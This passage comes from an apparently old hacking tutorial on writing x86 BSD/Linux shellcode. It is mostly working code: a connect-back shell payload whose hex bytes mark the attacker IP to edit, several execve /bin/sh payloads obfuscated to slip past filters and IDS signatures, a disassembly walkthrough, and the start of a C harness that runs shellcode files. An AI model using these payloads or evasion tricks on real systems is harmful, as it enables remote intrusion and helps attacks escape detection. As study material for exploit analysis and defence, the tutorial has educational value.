mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,3&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Define our counter = 3&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx,-1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The C code for our loop is: b = -1; for(int i =3;i&gt;0;i--) { dup(cli,++b) };&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
l00p:&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The loop code starts here.&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
inc&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This is the instead of the ++b code&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push this value first because it represents the last argument&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We push the second argument, the file descriptor from accept()&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,90&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We define the system call
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And call the kernel to execute&nbsp;&nbsp;
sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Substract 1 from cl
jnz l00p&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; This will continue the loop if cl != 0&nbsp;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;&nbsp;
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Next the execve of /bin/sh
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax,eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; First we create some zero's
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The 3e argument == NULL
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; So is the second&nbsp;
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; The first argument is a pointer to our string /bin/sh&nbsp;
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,59&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; We define the system call, execve.
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ;&nbsp;
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; And execute</pre>

<pre>callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '/bin/sh'</pre>

<pre>Shellcode generated from this assembly code will look like this. I have made the IP address bold so
you'll known where to search for it if you need to change it.</pre>

<pre>char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x52\x5e\x31\xc0\x88\x46\x07\x6a\x06\x6a\x01\x6a\x02\xb0"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x61\x50\xcd\x80\x89\xc2\x31\xc0\xc6\x46\x09\x02\x66\xc7\x46"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x0a\xaa\xaa\xc7\x46\x0c<b>\x0a\x06\x0c\x21</b>\x6a\x10\x8d\x46\x08"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x50\x52\x31\xc0\xb0\x62\x50\xcd\x80\xb1\x03\xbb\xff\xff\xff"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xff\x43\x53\x52\xb0\x5a\x50\xcd\x80\x80\xe9\x01\x75\xf3\x31"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xc0\x50\x50\x56\xb0\x3b\x50\xcd\x80\xe8\xa9\xff\xff\xff\x2f"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x62\x69\x6e\x2f\x73\x68";</pre>

<h2>
<u>Several shellcode tricks:</u></h2>

<pre>In some cases the buffer that causes the overflow is manipulated by the vulnerable&nbsp;
program.&nbsp; This happens more often then you might think and makes exploiting overflows
more difficult and often more fun !. For example many programs filter dots and slashes.&nbsp;
Oh my GOD !! isn't there something we can do about this ? yes there is ;-) We can use&nbsp;
the almighty 'inc' operator to increase the hex value of our ascii character. Below&nbsp;
is a simple example that illustrates how to do this but first a part from Intel's description
of 'inc'.


<i>Adds 1 to the destination operand, while preserving the state of the CF flag. The&nbsp;
destination operand can be a register or a memory location.


</i>Now an example in how to do this. Let's say we have the string:&nbsp;

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 'ABCD'

We can change B in to a C by using:&nbsp;

inc byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 2]&nbsp;

So what this does is the hex value of B is changed from 42 to 43 which represents C.&nbsp;&nbsp;
A working example of the assembly code required to do this:

BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:&nbsp;&nbsp;&nbsp;

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 10], al
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 11], esi
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi + 8]
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 15], ebx
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 19], eax
inc byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Now we have /bin.sh
inc byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 4]&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; Now we have /bin/sh&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 11]
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 19]
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '.bin.sh#-i#AAAABBBBCCCC'


This can also be done to obfuscate parts of shellcode that might trigger&nbsp;
IDS signatures. Incstructions such as ADD, SUB INC and DEC can be useful&nbsp;
for this. By using a loop you can recover strings at run time and by&nbsp;
doing so you might be able get undetected by an IDS or atleast, lower the
risk of detection. Have a look at the following example:


BITS 32

jmp short&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; callit

doit:

pop&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, [esi]
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 8], ebx
mov long&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 12], eax

mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl,7&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>The loop begins here, we will loop 7 times
</i>change:
dec byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + ecx - 1 ]&nbsp;&nbsp;&nbsp;&nbsp; ; <i>Change the byte on the right location&nbsp;
</i>sub&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; cl, 1&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>Update the counter 'cl'
</i>jnz change&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ; <i>Verify if we should break the loop&nbsp;

</i>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al, 0x0b
mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ebx, esi
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; ecx, [esi + 8]
lea&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; edx, [esi + 12]
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80

callit:
call&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; doit

db&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; '0cjo0ti#AAAABBBB'



The extra -1 in the line "dec byte [esi + ecx - 1 ]" is to make sure we&nbsp;
als change the byte [esi + 0]. The above assembly code will generate shell
code that changes the string '0cjo0ti' to '/bin/sh' and which will then do
an execve of it. The end result (after removing the #AAAABBB chars) will be:


char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xeb\x25\x5e\x31\xc0\x88\x46\x07\x8d\x1e\x89\x5e\x08\x89\x46"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x0c\xb1\x07\xfe\x4c\x0e\xff\x80\xe9\x01\x75\xf7\xb0\x0b\x89"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xf3\x8d\x4e\x08\x8d\x56\x0c\xcd\x80\xe8\xd6\xff\xff\xff\x30"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x63\x6a\x6f\x30\x74\x69";</pre>

<pre>A nice FreeBSD example to hide the /bin/sh string in simple execve shellcode:</pre>

<pre>BITS 32

<b>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 5],0x73&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 1],0x62
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi],0x2f&nbsp;&nbsp;&nbsp;&nbsp;</b>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax, eax
<b>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 7], al
mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 2],0x69
</b>push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
<b>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 6],0x68
</b>push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
<b>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 4],0x2f
</b>push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; esi
<b>mov byte&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; [esi + 3],0x6e
</b>mov&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; al,59
push&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; eax
int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; 0x80</pre>

<pre>So the string /bin/sh is build character for character and not in the correct&nbsp;
order. This will make it very hard for IDS's to detect the existance of the string!&nbsp;
By creating an exploit that would shift the bold made code during execution you&nbsp;
could make it extra hard to detect.</pre>

<pre>char shellcode[] =
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xc6\x46\x05\x73\xc6\x46\x01\x62\xc6\x06\x2f\x31\xc0\x88\x46"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x07\xc6\x46\x02\x69\x50\xc6\x46\x06\x68\x50\xc6\x46\x04\x2f"
&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x56\xc6\x46\x03\x6e\xb0\x3b\x50\xcd\x80";</pre>

<pre>A more advanced method to obfuscate your code is by encoding the shellcode and decoding
it at run time. While this seems very hard to do, trust me it is not. If you want to encode&nbsp;
shellcode the best way to do this is with some help from a simple c program. More information
on doing that will be released in another document on safemode.org</pre>

<pre>Ofcourse these are just simples example of obfuscating code. It work nice but isn't
really efficient. If you are really interested in this stuff, have a look at K2's&nbsp;
work at: <a href="http://www.ktwo.ca/security.html">http://www.ktwo.ca/security.html</a>.&nbsp;

</pre>

<h2>
<u>Trace system calls to debug assembly code:</u></h2>

<pre>When you assembly code doesn't work, don't give up because tools such as
ptrace and ktrace can help you allot ! They can show you the exact arguments
that are given to a system call, whether the system call was successful and if
any value was returned.</pre>

<pre>For example, if the FreeBSD connect shellcode fails, you can see why! Just work
like this:</pre>

<pre>ktrace ./s-proc -e &lt;compiled connect assembly code&gt;
kdump | more</pre>

<pre>snip snip snip</pre>

<pre>&nbsp; 1830 process&nbsp; RET&nbsp;&nbsp; write 17/0x11
&nbsp; 1830 process&nbsp; CALL&nbsp; socket(0x2,0x1,0x6)
&nbsp; 1830 process&nbsp; RET&nbsp;&nbsp; socket 3
&nbsp; 1830 process&nbsp; CALL&nbsp; connect(0x3,0x804b061,0x10)
&nbsp; 1830 process&nbsp; RET&nbsp;&nbsp; connect -1 errno 61 Connection refused</pre>

<pre>Aha ! Connection refused.</pre>

<pre>If you are developing on linux then strace is defenitly your best friend ;-)</pre>

<h2>
<br>
<b><u>Disassembling shellcode:</u></b></h2>
If you want to see how someone else create shellcode there are very simple
ways to disassemble
<br>it.&nbsp; What I normally use is a small perl script that writes the
shellcode to a file. For example, if
<br>I would like to get the assembly of the following shellcode:
<p>char shellcode[] =
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x5e\x31\xc0\xb0\x24\xcd\x80\xb0\x24\xcd\x80\xb0\x58\xbb\xad"
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xcd\x80";
</p><p>I just put it in a perl script like this:
</p><p>#!/usr/bin/perl -w
</p><p>$shellcode =
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\x5e\x31\xc0\xb0\x24\xcd\x80\xb0\x24\xcd\x80\xb0\x58\xbb\xad".
<br>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; "\xde\xe1\xfe\xb9\x69\x19\x12\x28\xba\x67\x45\x23\x01\xcd\x80";
</p><p>open(FILE, "&gt;shellcode.bin");
<br>print FILE "$shellcode";
<br>close(FILE);
</p><p>I saved the file as ww.pl and disassembled it:
</p><p>[10:50pm lappie] ./ww.pl
<br>[10:50pm lappie] ndisasm -b 32 shellcode.bin
<br>00000000&nbsp; 5E&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
pop esi
<br>00000001&nbsp; 31C0&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
xor eax,eax
<br>00000003&nbsp; B024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov al,0x24
<br>00000005&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 0x80
<br>00000007&nbsp; B024&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov al,0x24
<br>00000009&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 0x80
<br>0000000B&nbsp; B058&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov al,0x58
<br>0000000D&nbsp; BBADDEE1FE&nbsp;&nbsp;&nbsp; mov ebx,0xfee1dead
<br>00000012&nbsp; B969191228&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov ecx,0x28121969
<br>00000017&nbsp; BA67452301&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
mov edx,0x1234567
<br>0000001C&nbsp; CD80&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
int 0x80
<br>&nbsp;
</p><p>Et voila, here is the assembly. Now it is really easy to determine what
kind of shellcode
<br>this is and what technique is being used.
<br>&nbsp;
</p><h2>
<a name="process"></a><u>Shellcode processing program:</u></h2>

<pre>/*
&nbsp;* Generic program for testing shellcode byte arrays.
&nbsp;* Created by zillion and EVL
&nbsp;*
&nbsp;* Safemode.org !! Safemode.org !!
&nbsp;*/

#include &lt;stdio.h&gt;
#include &lt;stdlib.h&gt;
#include &lt;sys/types.h&gt;
#include &lt;sys/stat.h&gt;
#include &lt;unistd.h&gt;
#include &lt;errno.h&gt;

/*
&nbsp;* Print message
&nbsp;*/
static void
croak(const char *msg) {
&nbsp;&nbsp;&nbsp; fprintf(stderr, "%s\n", msg);
&nbsp;&nbsp;&nbsp; fflush(stderr);
}
/*
&nbsp;* Educate user.
&nbsp;*/
static void
usage(const char *prgnam) {
&nbsp;&nbsp;&nbsp; fprintf(stderr, "\nExecute code : %s -e &lt;file-containing-shellcode&gt;\n", prgnam);
&nbsp;&nbsp;&nbsp; fprintf(stderr, "Convert code : %s -p &lt;file-containing-shellcode&gt; \n\n", prgnam);
&nbsp;&nbsp;&nbsp; fflush(stderr);
&nbsp;&nbsp;&nbsp; exit(1);
}
/*
&nbsp;* Signal error and bail out.
&nbsp;*/
static void
barf(const char *msg) {
&nbsp;&nbsp;&nbsp; perror(msg);
&nbsp;&nbsp;&nbsp; exit(1);
}

/*
&nbsp;* Main code starts here
&nbsp;*/

int
main(int argc, char **argv) {
&nbsp;&nbsp;&nbsp; FILE&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *fp;
&nbsp;&nbsp;&nbsp; void&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; *code;
&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; arg;
&nbsp;&nbsp;&nbsp; int&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp; i;
